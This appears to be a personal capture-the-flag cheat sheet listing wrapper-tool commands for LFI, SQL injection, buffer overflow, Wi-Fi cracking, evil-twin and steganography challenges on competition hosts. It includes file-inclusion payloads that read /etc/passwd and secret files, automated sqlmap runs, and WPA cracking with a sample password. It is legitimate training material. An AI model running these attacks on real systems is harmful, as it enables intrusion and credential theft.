# What To Do

set up 3.144.177.121    lab.local login.lab.local dev.lab.local in /etc/hosts (for kali)

`sudo nano /etc/hosts`  
→ added `3.144.177.121 login.lab.local`

```bash
source /home/milizes/pwntools-env/venv/bin/activate
```

Download every file of the boxes into a folder.

Set:

```
export TARGET=ip
```

- S = target sites SQLI, include the whole site, https://sit-sqli.chals.io
- T = target site LFI

## OSINT challenges

```bash
ctf --enum $TARGET
```

## LFI

Go to the page, and click on the url to see where `?` starts:

```
https://sit-lfi.chals.io/reader.php?page=welcome.php
```

If we are given the target file, like `/secrets/notes.txt`, then we run:

```bash
ctf --lfi "curl -s 'https://sit-lfi.chals.io/reader.php?page={P}'" --file secrets/notes.txt

ctf --lfi "curl -s '$T/reader.php?page={P}'" --file secrets/notes.txt
```

If no file path given, reference `ctfkit.md`, maybe run `ctf --web`.

## SQLI, takes a long time

Run immediately:

```bash
ctf --find-input "https://sit-sqli.chals.io"

ctf --find-input $S
```

Example output:

```
== WHAT TO RUN NEXT ==
  1. address value 'id' is refused when changed (HTTP 403), and 'h' looks like a hash of it
       which hash:   ctf --sig 1 c4ca4238a0b923820dcc509a6f75849b
       then:         ctf --sqlmap-auto "https://sit-sqli.chals.io/orders?id=1&h=c4ca4238a0b923820dcc509a6f75849b"      (it recomputes the hash for every attempt)
  2. /catalog has a box named item (the value goes into the address)
       ctf --sqlmap-auto "https://sit-sqli.chals.io/catalog?item=1"
       a file name in that value instead of a number means file inclusion:  ctf --lfi "curl -s 'https://sit-sqli.chals.io/catalog?item={P}'" --file /etc/passwd
  3. /search has a box named q (the value goes into the address)
       ctf --sqlmap-auto "https://sit-sqli.chals.io/search?q=1"
       a file name in that value instead of a number means file inclusion:  ctf --lfi "curl -s 'https://sit-sqli.chals.io/search?q={P}'" --file /etc/passwd
  4. a script on the site sends a request to /cart (a button does it, not the address bar)
       ctf --sqlmap-auto "https://sit-sqli.chals.io/cart" --data '{"id": 1}'
       the body must be JSON like the script's; a normal form body may be refused with HTTP 415
  5. /account shows no input of its own: it may read a cookie or a value it never mentions
       ctf --find-input "https://sit-sqli.chals.io/account"
```

Run each `ctf --sqlmap-auto` command, follow it.

Reference `ctfkit.md` if can't.

## BOF

```bash
cd pwntools-env/venv/bof-scripts-main/
```

We will probably be given an ip, with a port for us to nc into:

```bash
nc 3.144.177.121 5002
```

Reference `bof.md`. If cannot, then reference `schctf3.md` for pwntools.

## Wireless

Given a `.pcap` file, lowkey cooked but its 3 hardcoded:

```bash
ctf --wifi-hidden
ctf --wifi-crack
ctf --evil-twin
```

Reference `walkthrough.pdf`.

If given a wordlist and an ssid, use:

```bash
ctf --wifi-crack file.pcap --ssid name --wordlist file.txt
```

Given a password: `FlatWhite2026CafeGuest`, ssid: `Cafe-Guest`, use:

```bash
ctf --evil-twin file.pcap --ssid name --psk password
```

## Steg

Given an image file:

```bash
ctf --stegchain image.file
```